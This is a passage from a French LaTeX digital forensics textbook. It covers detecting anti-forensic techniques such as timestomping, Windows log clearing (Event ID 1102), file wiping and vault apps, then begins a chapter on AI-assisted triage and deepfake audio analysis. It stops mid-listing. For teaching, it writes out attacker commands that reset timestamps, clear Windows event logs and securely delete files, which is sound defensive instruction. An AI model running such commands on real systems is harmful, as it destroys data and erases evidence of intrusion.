    Désactivation de logging, mode furtif, utilisation de RAM uniquement \\
\textbf{Diversion} & Détourner l'attention de l'investigateur &
    False flag (faire accuser un tiers), bruit de fond généré
    artificiellement \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~21.1 --- Taxonomie des techniques anti-forensiques}\end{center}

\subsection{Le principe de Locard inversé}

\begin{boxdef}
\textbf{Principe de Locard inversé}\index{Locard inversé}~:
toute tentative d'effacement ou de modification d'une preuve produit
elle-même de nouvelles traces. L'acte de suppression est lui-même
un événement système qui laisse des artefacts~--- souvent dans des
emplacements que l'attaquant ne maîtrise pas ou ignore.
\end{boxdef}

Ce principe explique pourquoi, dans l'affaire MVOM, la suppression du
script \texttt{enc\_all.ps1} (Ch.~\ref{chap:for-sys}) a elle-même été
enregistrée dans le \texttt{\$UsnJrnl} avec horodatage précis~: l'acte
de \texttt{FileDelete} est un événement journalisé au même titre
que \texttt{FileCreate}.

\begin{boxCRO}
\textbf{Analyse CRO --- L'asymétrie fondamentale de l'anti-forensique}

$\mathcal{R}$ (côté attaquant)~: pour effacer parfaitement une trace,
l'attaquant doit connaître \emph{tous} les artefacts qu'elle a générés
--- une connaissance rarement complète, même pour un attaquant
sophistiqué.

$\mathcal{R}$ (côté investigateur)~: il suffit qu'\emph{un seul}
artefact survive parmi les nombreux générés (redondance forensique)
pour révéler l'activité initiale ET la tentative d'effacement.

$\mathcal{O}$~: une tentative d'effacement détectée renforce
paradoxalement l'opposabilité du dossier~: elle démontre l'intention
(\textit{mens rea}) de dissimuler une activité, un élément
souvent utile à la qualification pénale.

\cro{$\sim$}{$\downarrow$ pour l'attaquant~; $\uparrow\uparrow$ pour l'investigateur}{$\uparrow$ preuve d'intention}

\textbf{Conclusion~:} l'asymétrie structurelle favorise l'investigateur.
La sophistication nécessaire pour un effacement parfait dépasse les
moyens de la grande majorité des attaquants, y compris sophistiqués.
\end{boxCRO}

% ============================================================================
\section{Anti-Forensique Système~: Détection des Tentatives}
\label{sec:anti-for-systeme}
% ============================================================================

\subsection{Timestomping~: manipulation des horodatages}

Le Chapitre~\ref{chap:for-sys} a introduit le timestomping et sa
détection par croisement \texttt{\$MFT}/\texttt{\$UsnJrnl}. Ce chapitre
approfondit les techniques et leurs limites.

\begin{boxoutils}{Outils de timestomping et leurs limites}
\begin{lstlisting}[language=bash_forensique]
# Outils couramment utilises par les attaquants :
# - timestomp.exe (Metasploit)
# - SetMACE
# - PowerShell natif :
Set-ItemProperty -Path "C:\malware.exe" -Name CreationTime `
    -Value "2020-01-01 00:00:00"
Set-ItemProperty -Path "C:\malware.exe" -Name LastWriteTime `
    -Value "2020-01-01 00:00:00"

# CE QUE CES OUTILS NE PEUVENT PAS MODIFIER :
# 1. Le $UsnJrnl -- enregistre l'evenement de modification
#    des timestamps lui-meme (USN_REASON_BASIC_INFO_CHANGE)
MFTECmd.exe -f \$UsnJrnl:\$J --csv ./output/
# Chercher : Reason contient "BasicInfoChange"
# Cet evenement EST la preuve du timestomping

# 2. Le $LogFile (journal de transactions NTFS)
# Contient l'historique des transactions, y compris les
# modifications de timestamps, sur une fenetre plus courte
# (quelques heures a quelques jours selon l'activite disque)
LogFileParser.exe -f \$LogFile --csv ./output/logfile.csv

# 3. Les artefacts independants (Prefetch, UserAssist, ShimCache)
# ne sont PAS synchronises avec les modifications du $MFT
# -- ils gardent leurs propres horodatages independants
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Détection de timestomping --- méthode systématique}
\textbf{Étape~1~:} comparer les 4~horodatages MACE d'un fichier suspect.
Une cohérence parfaite (les~4~identiques à la seconde près) est
elle-même suspecte~--- un fichier créé normalement présente rarement
4~horodatages strictement identiques.

\textbf{Étape~2~:} croiser avec le \texttt{\$UsnJrnl}. Si le
\texttt{\$UsnJrnl} contient un événement \texttt{FileCreate} à une
date différente de celle affichée dans le \texttt{\$MFT}, c'est
une preuve directe de manipulation.

\textbf{Étape~3~:} croiser avec les artefacts indépendants
(Prefetch, UserAssist). Si Prefetch enregistre une exécution à
une date que le \texttt{\$MFT} affiche comme antérieure à la
création du fichier, c'est une incohérence logique irréfutable.

\textbf{Constatation type~:}
``Le \texttt{\$MFT} affiche pour le fichier \texttt{rootkit.dll}
une date de création du 12/08/2019. Le \texttt{\$UsnJrnl} enregistre
un événement \texttt{FileCreate} pour ce même fichier le 13/03/2026
à 02h19:15, soit 6~ans et 7~mois après la date affichée par le
\texttt{\$MFT}. Cette divergence constitue une preuve technique
de modification des horodatages (timestomping).''
\end{boxscenario}

\subsection{Suppression sélective de logs}

\begin{boxoutils}{Techniques de suppression de logs Windows et détection}
\begin{lstlisting}[language=bash_forensique]
# Technique attaquant : effacer le journal des evenements
wevtutil cl Security
wevtutil cl System
# Efface TOUT le journal -- action elle-meme detectable

# DETECTION : l'effacement génère un evenement
# Event ID 1102 : "The audit log was cleared"
# Cet evenement EST enregistre dans le journal Security
# AVANT que celui-ci soit vide, OU dans le journal qui suit

# Recherche de l'Event ID 1102 (preuve d'effacement de logs)
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text

# Technique plus sophistiquee : suppression selective d'evenements
# (modification directe du fichier .evtx)
# DETECTION : comparer le nombre d'evenements attendu
# (frequence normale) avec le nombre observe -- un "trou"
# dans la sequence des Event ID est suspect

# Verifier la continuite des RecordNumber (numero sequentiel)
# Si RecordNumber saute de 4521 a 4598, 76 evenements manquent
Get-WinEvent -Path security.evtx |
    Select-Object RecordId, TimeCreated, Id |
    Sort-Object RecordId
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{L'Event~ID~1102~: la signature universelle de l'effacement Windows}

\texttt{wevtutil cl} (\textit{clear log}) est la commande la plus
utilisée par les attaquants pour effacer leurs traces. Elle génère
\emph{systématiquement} l'Event~ID~1102 (``Le journal d'audit a été
effacé''), qui survit à l'effacement lui-même car il est écrit
\emph{après} l'opération de nettoyage. \textbf{Chercher l'Event~ID~1102
doit être un réflexe systématique} dans toute investigation Windows
suspectant une dissimulation.
\end{boxalert}

\subsection{Wiping et suppression sécurisée}

\begin{boxoutils}{Détection de wiping de fichiers}
\begin{lstlisting}[language=bash_forensique]
# Outils de wiping courants : sdelete (Sysinternals), CCleaner,
# Eraser -- ecrivent des donnees aleatoires sur l'espace libere

# DETECTION 1 : signature de sdelete dans le $MFT
# sdelete renomme le fichier en une chaine de caracteres avant
# suppression -- cette sequence de renommages est visible dans
# le $UsnJrnl
MFTECmd.exe -f \$UsnJrnl:\$J --csv ./output/ |
    grep -E "RenameOldName|RenameNewName"
# Plusieurs renommages successifs rapides = signature sdelete

# DETECTION 2 : entropie de l'espace libere
# Wiping remplit l'espace de donnees aleatoires (haute entropie)
# Espace libere normalement (juste marque disponible) garde
# le contenu original jusqu'a reecriture -- entropie variable
photorec /d /output/ -cmd /dev/sdb1 freespace
# Analyser l'entropie de l'espace libere :
ent /output/freespace_dump.bin
# Entropie proche de 8.0 bits/byte sur de larges plages = wiping

# DETECTION 3 : logs d'execution de l'outil de wiping lui-meme
# (ironie : l'outil de suppression de preuves laisse ses propres
# traces -- Prefetch, UserAssist, ShimCache pour sdelete.exe)
PECmd.exe -f SDELETE.EXE-XXXXXXXX.pf
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Anti-Forensique Réseau~: Désactivation et Camouflage}
\label{sec:anti-for-reseau}
% ============================================================================

\subsection{Désactivation de logging~: le cas CloudTrail}

Le Chapitre~\ref{chap:for-cloud} a présenté la tentative
\texttt{StopLogging} dans l'affaire MVOM. Ce mécanisme se généralise~:

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Plateforme} &
    \tableauHeader{Action de désactivation} &
    \tableauHeader{Contre-mesure architecturale}
}
AWS CloudTrail & \texttt{StopLogging}, \texttt{DeleteTrail} &
    Object Lock (WORM) sur le bucket~S3~; alerte CloudWatch
    sur ces actions \\
Azure Activity Log & Désactivation via portail (rare, nécessite
    droits élevés) & Logs exportés vers Log~Analytics
    (rétention indépendante) \\
Logs Windows & \texttt{wevtutil cl} &
    Forwarding vers serveur Syslog centralisé (SIEM) en temps réel \\
journald (Linux) & \texttt{journalctl --vacuum-time} &
    Forwarding rsyslog vers serveur distant~; \texttt{Storage=persistent} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~21.2 --- Désactivation de logging et contre-mesures}\end{center}

\begin{boiteRemarque}{Le principe du forwarding~: la meilleure défense}
La contre-mesure la plus efficace contre toute désactivation de
logging \emph{locale} est le \textbf{forwarding en temps réel} vers
un système distant que l'attaquant ne contrôle pas. Un attaquant
qui compromet un serveur et désactive ses logs locaux ne peut pas
effacer ce qui a déjà été transmis ailleurs. Cette architecture
(SIEM centralisé) devrait être recommandée dans toute mission de
sécurisation post-incident.
\end{boiteRemarque}

\subsection{Chiffrement opportuniste et tunneling}

\begin{boxoutils}{Détection de canaux chiffrés non identifiés}
\begin{lstlisting}[language=bash_forensique]
# L'attaquant chiffre son C2 pour eviter l'inspection du contenu
# (vu en Ch. 15 : tunneling DNS, HTTPS legitime detourne)

# Detection par metadonnees (meme si contenu illisible) :
# 1. Certificat TLS auto-signe ou recent
tshark -r capture.pcap -Y "tls.handshake.type == 11" \
    -T fields -e tls.handshake.certificate
# Verifier la date d'emission du certificat -- recent = suspect

# 2. JA3/JA3S fingerprinting (signature du client TLS)
# Outil : ja3 (python)
python3 ja3.py capture.pcap
# Comparer avec des bases de signatures malveillantes connues
# (ja3er.com, abuse.ch SSL Blacklist)

# 3. Pattern de connexion meme sans dechiffrement
# (beaconing -- vu en Ch. 15 -- fonctionne meme sur trafic chiffre,
# car les METADONNEES de connexion restent visibles)
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Anti-Forensique Mobile et IoT}
\label{sec:anti-for-mobile-iot}
% ============================================================================

\subsection{Factory reset~: ce qui survit réellement}

Le Chapitre~\ref{chap:for-iot} a introduit la limite du factory reset.
Cette section approfondit, avec application au mobile (Ch.~\ref{chap:for-mob}).

\begin{tableaucours}{p{3.2cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Données} &
    \tableauHeader{Effacées par factory reset~?} &
    \tableauHeader{Source de récupération}
}
Stockage interne (\texttt{/data}) & Oui (en général) &
    Carving sur l'espace non réécrit (extraction physique avant
    réécriture complète) \\
Carte SD externe & \textbf{Non} (sauf reformatage explicite) &
    Extraction directe de la SD \\
Logs opérateur (appels, SMS, data) & Non (jamais sur l'appareil) &
    Réquisition opérateur (art.~57 Loi~2010) \\
Données cloud synchronisées
    (avant le reset) & Non &
    Réquisition fournisseur (Google, iCloud) \\
Historique réseau opérateur
    (cellules GSM) & Non &
    Réquisition + analyse Cell~ID (Ch.~\ref{chap:for-mob}) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~21.3 --- Factory reset~: ce qui est réellement effacé}\end{center}

\subsection{Applications ``vault'' et conteneurs cachés}

\begin{boxalert}
\textbf{Applications vault~: dissimulation par camouflage}

Les applications de type ``vault'' (\textit{Calculator+},
\textit{Vault -- Hide Photos}) se présentent sous l'apparence
d'une application anodine (calculatrice) mais cachent un conteneur
chiffré accessible par un code secret.

\textbf{Détection~:}
\begin{itemize}
    \item \texttt{adb shell pm list packages -f} révèle le nom de
          package réel, souvent différent du nom affiché
          (ex.~: \texttt{com.vault.hideit} pour une icône
          ``Calculatrice'')~;
    \item Analyse de la taille du stockage de l'application
          (\texttt{adb shell dumpsys package <package>}) -- une
          calculatrice de 200~Mo est suspecte~;
    \item Liste des permissions demandées (accès photos, stockage)
          incohérente avec la fonction affichée.
\end{itemize}
\end{boxalert}

\subsection{Suppression sélective WhatsApp/Telegram}

\begin{boxoutils}{Détection de suppression de conversations}
\begin{lstlisting}[language=bash_forensique]
-- Sur msgstore.db (WhatsApp, Ch. 16), verifier les "trous"
-- dans la sequence des _id (cles primaires auto-incrementees)
SELECT _id, timestamp FROM messages ORDER BY _id;
-- Si _id saute de 1847 a 1901, 53 messages ont ete supprimes

-- WhatsApp conserve des backups automatiques quotidiens
-- (msgstore-YYYY-MM-DD.1.db.crypt15) sur 7 jours par defaut
-- Comparer le backup de la veille avec la base actuelle :
-- les messages presents dans le backup mais absents de la base
-- actuelle ont ete supprimes par l'utilisateur

-- Telegram (cache local, moins de retention) :
-- chercher les fichiers cache/ supprimes via carving
-- (Ch. 9 -- foremost/scalpel) sur l'extraction du telephone
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Documenter une Tentative d'Anti-Forensique dans le Rapport}
\label{sec:documentation-anti-for}
% ============================================================================

La détection d'une tentative d'anti-forensique doit être documentée
selon les mêmes règles que toute autre constatation
(Ch.~\ref{chap:rapport})~--- avec une attention particulière car
elle constitue souvent un élément d'intention (\textit{mens rea}).

\begin{lstlisting}[language=bash_forensique,
    caption={Exemple de constatation et analyse --- tentative d'anti-forensique}]
CONSTATATIONS (anti-forensique) :

C.10 : Le journal des événements Security du serveur enregistre
       un événement Event ID 1102 ("Le journal d'audit a été
       effacé") à 02h19:48, par le compte "admin".
       [Source : wevtutil, Annexe H]

C.11 : Le $UsnJrnl enregistre la suppression du fichier
       "enc_all.ps1" à 02h18:30, 1 minute et 18 secondes avant
       l'effacement du journal Security (C.10).
       [Source : MFTECmd, Annexe B]

ANALYSE :

La séquence temporelle C.10-C.11 est cohérente, avec un niveau
de confiance élevé, avec une tentative de dissimulation des
traces de l'intrusion par l'auteur de l'attaque. Cette tentative
n'a cependant pas atteint son objectif : le $UsnJrnl, distinct
du journal des événements Security, conserve l'historique complet
des opérations sur le système de fichiers, incluant la création
et la suppression du script malveillant.

Hypothèse alternative envisagée et écartée : une maintenance
système légitime aurait pu causer cet effacement de logs.
Cette hypothèse est écartée car (1) aucune fenêtre de maintenance
n'était planifiée à cette date selon les procédures de
l'entreprise (Annexe E) et (2) la proximité temporelle immédiate
avec la suppression du fichier malveillant (78 secondes) rend
cette coïncidence hautement improbable.
\end{lstlisting}

\begin{boxjuris}
\textbf{Valeur juridique de la tentative d'anti-forensique}

En droit camerounais, la tentative de dissimulation de preuves
peut constituer un élément aggravant ou un indice de l'intention
coupable. L'art.~88 \loicam{2010/012} (refus de remise de clé de
déchiffrement, Ch.~\ref{chap:droit-cam}) illustre ce principe~:
le législateur sanctionne spécifiquement les comportements
d'obstruction à l'investigation. La documentation rigoureuse
d'une tentative d'effacement (avec ses propres constatations
et sources) renforce la valeur probatoire du dossier dans
son ensemble.
\end{boxjuris}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Principe de Locard inversé}~: toute tentative
          d'effacement produit elle-même de nouvelles traces.
          L'asymétrie favorise structurellement l'investigateur~:
          un seul artefact survivant suffit à révéler l'activité
          \emph{et} la tentative de dissimulation.

    \item \textbf{Timestomping}~: détecté par croisement
          \texttt{\$MFT}/\texttt{\$UsnJrnl}~; les outils de
          timestomping ne peuvent pas modifier le \texttt{\$UsnJrnl}
          ni les artefacts indépendants (Prefetch, UserAssist).

    \item \textbf{Event~ID~1102}~: signature universelle de
          l'effacement des journaux Windows (\texttt{wevtutil cl}).
          Réflexe systématique de recherche dans toute investigation
          suspectant une dissimulation.

    \item \textbf{Le forwarding en temps réel} (SIEM centralisé)
          est la meilleure architecture de défense~: un attaquant
          qui efface les logs locaux ne peut rien contre ce qui a
          déjà été transmis ailleurs.

    \item \textbf{Factory reset}~: n'efface ni la SD~Card externe,
          ni les logs opérateur, ni les données cloud déjà
          synchronisées. Toujours compléter par réquisition.

    \item \textbf{Applications vault}~: détectées par le nom de
          package réel (\texttt{pm list packages -f}), la taille
          de stockage incohérente, les permissions excessives.

    \item \textbf{Documentation}~: une tentative d'anti-forensique
          se documente comme toute constatation (source, horodatage)
          suivie d'une analyse avec niveau de confiance et
          hypothèses alternatives réfutées (E9bis PIU). Elle
          constitue souvent un indice d'intention coupable.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~21.1 --- Identifier les techniques \niveaubase}]
Pour chacune des observations suivantes, identifiez la catégorie
d'anti-forensique (Tableau~21.1) et la contre-mesure de détection
appropriée~:
\begin{enumerate}[(a)]
    \item Un fichier affiche une date de création de 2015 mais
          son contenu fait référence à un événement de 2026.
    \item Le journal Security d'un serveur Windows est vide pour
          toute la journée du 13~mars~2026.
    \item Un suspect possède une application ``Calculatrice''
          qui pèse 340~Mo sur son téléphone.
    \item Un trafic réseau chiffré présente des connexions toutes
          les exactement 300~secondes vers la même IP.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~21.2 --- Détection de timestomping \niveaumoyen}]
L'analyse \texttt{\$MFT} d'un fichier \texttt{backdoor.dll} montre~:
\begin{lstlisting}[language=bash_forensique]
Created (E):   2018-03-22 09:15:00
Modified (M):  2018-03-22 09:15:00
Accessed (A):  2018-03-22 09:15:00
Changed (C):   2018-03-22 09:15:00
\end{lstlisting}
L'analyse \texttt{\$UsnJrnl} montre~:
\begin{lstlisting}[language=bash_forensique]
2026-03-13 02:19:15  backdoor.dll  FileCreate
2026-03-13 02:19:16  backdoor.dll  DataExtend|Close
2026-03-13 02:19:20  backdoor.dll  BasicInfoChange
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Interprétez chacune des trois lignes du \texttt{\$UsnJrnl}.
          Que signifie spécifiquement \texttt{BasicInfoChange}~?
    \item Rédigez la constatation forensique correspondante,
          en respectant la distinction constatation/analyse.
    \item Pourquoi les 4~horodatages MACE parfaitement identiques
          dans le \texttt{\$MFT} sont-ils eux-mêmes un indice
          suspect, indépendamment de la divergence avec le
          \texttt{\$UsnJrnl}~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~21.3 --- Investigation complète avec anti-forensique \niveauexpert}]
Dans l'affaire ONAMBELE (Ch.~\ref{chap:gr-affaires}), vous découvrez
les éléments suivants lors de l'analyse du serveur compromis~:
\begin{itemize}
    \item Event~ID~1102 dans le journal Security à 03h42:15~;
    \item \texttt{\$UsnJrnl}~: suppression de 14~fichiers \texttt{.xlsx}
          entre 03h40:00 et 03h41:30~;
    \item Un fichier \texttt{cleanup.bat} dans le Prefetch, exécuté
          à 03h39:50, contenant (reconstitué depuis la RAM via
          Volatility \texttt{cmdline})~:
\begin{lstlisting}[language=bash_forensique]
del C:\Finance\rapports\*.xlsx
wevtutil cl Security
wevtutil cl System
sdelete -p 3 C:\Finance\rapports\*
\end{lstlisting}
\end{itemize}
\begin{enumerate}[(a)]
    \item Reconstituez la chronologie complète des événements,
          en distinguant ce qui s'est passé et ce qui a été
          tenté pour le dissimuler.
    \item L'utilisation de \texttt{sdelete -p~3} (3~passes
          d'écrasement) rend-elle les fichiers \texttt{.xlsx}
          définitivement irrécupérables~? Quelles sources
          alternatives existent malgré cela (pensez aux chapitres
          précédents~: sauvegardes, logs réseau, copies cloud)~?
    \item Rédigez 4~constatations et l'analyse correspondante,
          en respectant scrupuleusement la structure du
          Ch.~\ref{chap:rapport}.
    \item Quelle valeur cette séquence (suppression~$\to$
          effacement logs~$\to$ wiping sécurisé) apporte-t-elle
          à la démonstration de l'intention coupable~? Comment
          formuler cela sans franchir la limite de la qualification
          juridique (réservée à l'autorité judiciaire)~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La maîtrise de l'anti-forensique complète le
socle technique du cours~: vous savez désormais non seulement
investiguer, mais aussi reconnaître et contrer les tentatives de
dissimulation. Cette compétence est transversale~--- elle
s'applique à chaque type d'evidence rencontré dans la Partie~IV.

Les chapitres suivants de la Partie~V (selon le programme retenu)
abordent les perspectives prospectives~: OSINT avancé, intelligence
artificielle appliquée à la détection d'anomalies, et impact
des technologies post-quantiques sur l'intégrité des preuves
numériques à long terme.
\end{boxinfo}
   
        % ============================================================================
% Fichier  : partie5/P05_C22_ia_forensique.tex
% Titre    : Intelligence Artificielle et Forensique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Construit ex-nihilo (aucune source projet ne couvre l'IA/ML)
%            Ancré sur le cas MUNGO (deepfakes électoraux, Ch.20) et la
%            méthode ACH/E8-E9 du PIU (Ch.6) appliquée au triage automatisé
% Positionnement : Deuxième chapitre de la Partie V. Deux faces : l'IA comme
%                  OUTIL de l'investigateur (triage, anomalies) et l'IA comme
%                  OBJET d'investigation (deepfakes, contenus synthétiques).
%                  Referme la question laissée ouverte par le cas MUNGO
%                  (Ch.20) sur l'analyse forensique des deepfakes audio.
% ============================================================================

\chapter{Intelligence Artificielle et Forensique}
\label{chap:ia-for}

\epigraph{%
    « L'intelligence artificielle ne ment pas mieux que l'humain ---
    elle ment plus vite, à plus grande échelle, et laisse des traces
    différentes. »%
}{--- Adapté de la pratique forensique contemporaine}

\niveauChapitre{Expert}{%
    Notions de machine learning recommandées mais non indispensables~:
    ce chapitre explique les concepts nécessaires. Lecture du cas
    MUNGO (Ch.~\ref{chap:cas-int}) recommandée.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Distinguer les deux usages de l'IA en forensique~: l'IA
          comme outil d'investigation et l'IA comme objet d'investigation.
    \item Appliquer des techniques de triage automatisé pour
          prioriser l'analyse de grands volumes de données.
    \item Détecter forensiquement les contenus générés ou modifiés
          par IA~: images, audio (deepfakes), texte.
    \item Comprendre les limites épistémologiques des outils d'IA
          en contexte judiciaire~: biais, explicabilité, robustesse
          au contre-interrogatoire.
    \item Documenter une analyse assistée par IA dans le respect
          de la distinction constatation/analyse (NIST~SP~800-86).
    \item Anticiper les évolutions de l'IA générative et leur
          impact sur l'admissibilité des preuves numériques.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Deux visages de l'intelligence artificielle en forensique}
% ============================================================================

Le cas MUNGO (Ch.~\ref{chap:cas-int}) a posé une question restée
ouverte~: comment analyser forensiquement un clip audio deepfake~?
Ce chapitre y répond en élargissant le cadre~: l'intelligence
artificielle se présente sous deux visages distincts pour
l'investigateur numérique.

\begin{enumerate}
    \item \textbf{L'IA comme outil}~: accélérer le triage de
          téraoctets de données, détecter des anomalies invisibles
          à l'\oe il humain, automatiser des tâches répétitives.
    \item \textbf{L'IA comme objet}~: les contenus générés par IA
          (deepfakes, textes synthétiques, images générées) deviennent
          eux-mêmes des preuves ou des éléments à authentifier.
\end{enumerate}

Ces deux visages exigent des compétences différentes mais
complémentaires.

\separateur

% ============================================================================
\section{L'IA comme Outil~: Triage et Détection d'Anomalies}
\label{sec:ia-outil}
% ============================================================================

\subsection{Le problème du volume}

Une investigation moderne implique fréquemment des volumes de données
qu'aucune analyse manuelle exhaustive ne peut traiter dans des délais
raisonnables~: des millions d'emails, des téraoctets de logs réseau,
des dizaines de milliers de photos. Le rôle de l'IA n'est pas de
remplacer l'investigateur mais de \textbf{prioriser} ce qu'il doit
examiner en premier.

\begin{boxdef}
\textbf{Triage assisté par IA}\index{triage assisté par IA}~:
utilisation d'algorithmes de classification ou de détection
d'anomalies pour ordonner un volume de données selon leur pertinence
probable, \emph{sans} se substituer à la décision finale de
l'investigateur humain.
\end{boxdef}

\subsection{Classification d'emails et de documents}

\begin{boxoutils}{Triage d'emails avec classification supervisée}
\begin{lstlisting}[language=bash_forensique]
# Cas type : 50 000 emails saisis dans l'affaire FAKO (Ch.20)
# Objectif : identifier les emails pertinents pour la fraude
# comptable sans les lire un par un

# Approche 1 : classification par mots-cles ponderes (simple,
# explicable -- recommande en premiere passe)
python3 << 'EOF'
import re
from collections import Counter

mots_cles = {
    'virement': 3, 'compte bancaire': 3, 'urgent': 1,
    'confidentiel': 2, 'ne pas divulguer': 3, 'IBAN': 3,
    'mot de passe': 2, 'autorisation': 1
}

def score_email(texte):
    texte_lower = texte.lower()
    return sum(poids for mot, poids in mots_cles.items()
               if mot in texte_lower)

# Trier les emails par score decroissant
# Les 200 emails les plus eleves sont examines en priorite
EOF

# Approche 2 : modele de classification (necessite jeu
# d'entrainement -- moins explicable, a documenter avec precaution)
# scikit-learn, classification Naive Bayes ou SVM
# ATTENTION : un modele "boite noire" pose un probleme
# d'explicabilite en contexte judiciaire (cf. section limites)
\end{lstlisting}
\end{boxoutils}

\begin{boxCRO}
\textbf{Analyse CRO --- Triage IA et risque de biais}

$\mathcal{R}$ (Fiabilité)~: un modèle de triage bien calibré accélère
l'identification de preuves pertinentes, mais peut introduire des
faux négatifs systématiques (documents pertinents non identifiés
car ne correspondant pas aux patterns d'entraînement).

$\mathcal{O}$ (Opposabilité)~: un tri qui \emph{exclut} des documents
de l'examen humain pose un risque majeur~: si la défense découvre
qu'un document à décharge a été écarté par l'algorithme sans examen
humain, c'est l'ensemble du processus qui est compromis.

\cro{$\sim$}{$\uparrow$ vitesse, $\downarrow$ risque faux négatifs}{$\downarrow\downarrow$ si exclusion sans validation humaine}

\textbf{Règle pratique impérative~:} l'IA \textbf{priorise}, elle
ne \textbf{décide jamais} de l'exclusion définitive d'un document
de l'examen. Tout document, même classé comme peu pertinent, doit
rester accessible et son score de classification documenté.
\end{boxCRO}

\subsection{Détection d'anomalies dans les logs}

\begin{boxoutils}{Détection d'anomalies comportementales (UEBA)}
\begin{lstlisting}[language=bash_forensique]
# UEBA : User and Entity Behavior Analytics
# Principe : etablir une baseline du comportement normal d'un
# utilisateur ou systeme, puis detecter les ecarts statistiques

# Exemple simplifie : detection d'horaires de connexion anormaux
python3 << 'EOF'
import pandas as pd
from sklearn.ensemble import IsolationForest

# Chargement des logs de connexion (Event ID 4624, Ch. 14)
df = pd.read_csv('connexions.csv')
# Colonnes : heure_connexion, jour_semaine, duree_session, volume_donnees

# Modele de detection d'anomalies (non supervise)
modele = IsolationForest(contamination=0.05, random_state=42)
df['anomalie'] = modele.fit_predict(
    df[['heure_connexion', 'jour_semaine', 'duree_session']]
)

# Les connexions marquees -1 sont des anomalies statistiques
anomalies = df[df['anomalie'] == -1]
print(f"{len(anomalies)} connexions anormales identifiees sur "
      f"{len(df)} totales")
EOF

# IMPORTANT : une anomalie statistique n'est PAS une preuve de
# malveillance. C'est un signal de priorisation pour examen humain.
# Documenter : "X connexions ont ete identifiees comme statistiquement
# atypiques par le modele Isolation Forest (parametres : contamination=
# 0.05) et ont fait l'objet d'un examen manuel detaille."
\end{lstlisting}
\end{boxoutils}

\subsection{Reconnaissance d'objets dans les preuves visuelles}

\begin{boxoutils}{Détection automatisée dans des collections de médias}
\begin{lstlisting}[language=bash_forensique]
# Cas type : 15 000 photos extraites d'un telephone (Ch. 16)
# Objectif : identifier rapidement les photos contenant des
# documents, des armes, ou des visages specifiques

# Outils disponibles dans Autopsy (Ch. 16) :
# - Module "Object Detection" : categories generiques
#   (personne, vehicule, document, arme)
# - Module "Facial Recognition" : regroupement par visage
#   (PAS d'identification -- juste regroupement de similarite)

# Limite cruciale : la reconnaissance faciale automatisee a un
# taux d'erreur variable selon les populations -- documenter
# systematiquement le taux de faux positifs/negatifs du modele
# utilise et ne JAMAIS presenter une correspondance faciale
# automatisee comme une identification certaine sans validation
# par un examinateur qualifie
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{L'IA comme Objet~: Détecter les Contenus Synthétiques}
\label{sec:ia-objet}
% ============================================================================

\subsection{Taxonomie des contenus générés par IA}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Type} &
    \tableauHeader{Technologie typique} &
    \tableauHeader{Contexte forensique camerounais}
}
\textbf{Deepfake vidéo} & GAN, modèles de diffusion vidéo &
    Vidéos compromettantes fabriquées, désinformation politique \\
\textbf{Deepfake audio} & Clonage vocal (modèles \textit{text-to-speech}) &
    Fausses déclarations attribuées (cas MUNGO, Ch.~\ref{chap:cas-int})~;
    arnaques par usurpation vocale \\
\textbf{Image générée} & Diffusion (Midjourney, Stable Diffusion) &
    Faux documents d'identité, fausses preuves visuelles \\
\textbf{Texte généré} & LLM (GPT, Claude, Llama) &
    Faux témoignages écrits, emails de phishing sophistiqués,
    faux articles de presse \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~22.1 --- Taxonomie des contenus synthétiques}\end{center}

\subsection{Détection de deepfakes audio~: le cas MUNGO résolu}

Reprenons la question laissée ouverte au Ch.~\ref{chap:cas-int}~:
comment analyser forensiquement les 12~clips audio deepfake de
l'affaire MUNGO~?

\begin{boxoutils}{Analyse forensique d'un clip audio suspect}
\begin{lstlisting}[language=bash_forensique]
# Etape 1 : analyse des metadonnees du fichier audio
exiftool clip_suspect.mp3
# Chercher : logiciel d'encodage, absence de metadonnees
# d'enregistrement original (date GPS, modele d'appareil)
# -- un enregistrement authentique sur smartphone a generalement
# des metadonnees riches ; un deepfake genere n'en a souvent aucune

# Etape 2 : analyse spectrale (spectrogramme)
sox clip_suspect.mp3 -n spectrogram -o spectrogramme.png
# Les voix de synthese presentent souvent :
# - une absence de bruit de fond naturel (silence trop "propre")
# - des artefacts de frequence caracteristiques du vocoder utilise
# - une regularite anormale du rythme respiratoire (souvent absent)

# Etape 3 : outils de detection specialises
# (recherche academique active, taux de detection variable)
# - Resemblyzer (analyse d'empreinte vocale)
python3 -c "
from resemblyzer import VoiceEncoder, preprocess_wav
encoder = VoiceEncoder()
wav = preprocess_wav('clip_suspect.wav')
embedding = encoder.embed_utterance(wav)
# Comparer avec un echantillon authentique connu du candidat
"

# - Detecteurs commerciaux : Pindrop, Resemble Detect,
#   Microsoft Video Authenticator (limites : taux de faux
#   positifs/negatifs evoluent avec chaque nouvelle generation
#   de modeles generatifs -- TOUJOURS documenter la version
#   de l'outil et sa date d'evaluation independante)

